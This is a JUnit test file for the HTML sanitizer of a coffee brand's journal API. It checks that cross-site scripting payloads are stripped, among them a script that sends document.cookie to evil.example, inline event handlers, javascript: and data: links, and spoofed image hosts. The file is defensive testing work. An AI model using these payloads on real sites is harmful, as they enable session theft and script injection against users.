package com.nocteon.nocteon_api.common.service;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import com.nocteon.nocteon_api.cloudinary.config.CloudinaryProperties;

/**
 * The journal allowlist.
 *
 * <p>These are the payloads a compromised admin session would post: a script tag, an
 * event handler on an otherwise allowed tag, a {@code javascript:} link and an image
 * that beacons to another origin. Each one is asserted on the sanitized string, because
 * that string is what reaches the table and what the public site renders as HTML.
 */
class HtmlSanitizerTest {

    private static final String OWN_IMAGE =
            "https://res.cloudinary.com/nocteon-test/image/upload/v1/nocteon/journal/bag.jpg";

    private HtmlSanitizer sanitizer;

    @BeforeEach
    void setUp() {
        CloudinaryProperties properties = new CloudinaryProperties();
        properties.setCloudName("nocteon-test");
        sanitizer = new HtmlSanitizer(properties);
    }

    @Test
    @DisplayName("script elements and inline event handlers never survive")
    void dropsScriptsAndEventHandlers() {
        String stored = sanitizer.sanitize(
                "<p onclick=\"steal()\">Hello</p>"
                        + "<script>fetch('https://evil.example/'+document.cookie)</script>"
                        + "<img src=\"" + OWN_IMAGE + "\" onerror=\"alert(1)\">"
                        + "<a href=\"https://nocteon.coffee\" onmouseover=\"steal()\">shop</a>");

        assertThat(stored).doesNotContain("script", "onclick", "onerror", "onmouseover");
        assertThat(stored).contains("<p>Hello</p>");
        assertThat(stored).contains("href=\"https://nocteon.coffee\"");
    }

    @Test
    @DisplayName("the editor's own formatting is preserved")
    void keepsAllowlistedFormatting() {
        String body = "<h2>Brewing</h2>"
                + "<p><strong>Grind</strong> <em>fresh</em> <u>daily</u> <s>never stale</s></p>"
                + "<ul><li>One</li></ul><ol><li>Two</li></ol>"
                + "<blockquote>Quote</blockquote>"
                + "<pre><code>grind();</code></pre>"
                + "<p>Line<br>break</p><hr>"
                + "<table><thead><tr><th scope=\"col\">A</th></tr></thead>"
                + "<tbody><tr><td>1</td></tr></tbody></table>";

        String stored = sanitizer.sanitize(body);

        assertThat(stored).contains("<h2>Brewing</h2>");
        assertThat(stored).contains("<strong>Grind</strong>");
        assertThat(stored).contains("<em>fresh</em>", "<u>daily</u>", "<s>never stale</s>");
        assertThat(stored).contains("<ul><li>One</li></ul>", "<ol><li>Two</li></ol>");
        assertThat(stored).contains("<blockquote>Quote</blockquote>");
        assertThat(stored).contains("<pre><code>grind();</code></pre>");
        assertThat(stored).contains("<br>", "<hr>");
        assertThat(stored).contains("<table>", "<th scope=\"col\">A</th>", "<td>1</td>");
    }

    @Test
    @DisplayName("links are limited to https and mailto, and carry rel=noopener")
    void limitsLinkProtocols() {
        String stored = sanitizer.sanitize(
                "<a href=\"javascript:alert(1)\">js</a>"
                        + "<a href=\"data:text/html,<script>alert(1)</script>\">data</a>"
                        + "<a href=\"http://nocteon.coffee\">http</a>"
                        + "<a href=\"mailto:hello@nocteon.coffee\">mail</a>"
                        + "<a href=\"https://nocteon.coffee\">https</a>");

        assertThat(stored).doesNotContain("javascript:", "data:text", "http://nocteon.coffee");
        assertThat(stored).contains("mailto:hello@nocteon.coffee");
        assertThat(stored).contains("href=\"https://nocteon.coffee\" rel=\"noopener noreferrer\"");
    }

    @Test
    @DisplayName("images are limited to this account's Cloudinary folder")
    void limitsImageHosts() {
        String stored = sanitizer.sanitize(
                "<img src=\"" + OWN_IMAGE + "\" alt=\"bag\">"
                        + "<img src=\"https://evil.example/nocteon/journal/bag.jpg\">"
                        + "<img src=\"http://res.cloudinary.com/nocteon-test/image/upload/nocteon/journal/bag.jpg\">"
                        + "<img src=\"https://res.cloudinary.com@evil.example/nocteon-test/image/upload/nocteon/journal/a.jpg\">"
                        + "<img src=\"https://res.cloudinary.com/other-account/image/upload/nocteon/journal/a.jpg\">");

        assertThat(stored).contains(OWN_IMAGE);
        assertThat(stored).contains("alt=\"bag\"");
        assertThat(stored).doesNotContain("evil.example");
        assertThat(stored).doesNotContain("other-account");
        assertThat(stored).doesNotContain("http://res.cloudinary.com");
    }

    @Test
    @DisplayName("style, class and id are not kept: the public stylesheet owns presentation")
    void dropsPresentationalAttributes() {
        String stored = sanitizer.sanitize(
                "<p style=\"position:fixed;top:0\" class=\"overlay\" id=\"x\">Text</p>");

        assertThat(stored).isEqualTo("<p>Text</p>");
    }

    @Test
    @DisplayName("null and blank pass through instead of becoming an empty document")
    void passesEmptyValuesThrough() {
        assertThat(sanitizer.sanitize(null)).isNull();
        assertThat(sanitizer.sanitize("")).isEmpty();
        assertThat(sanitizer.sanitize("   ")).isEqualTo("   ");
    }
}
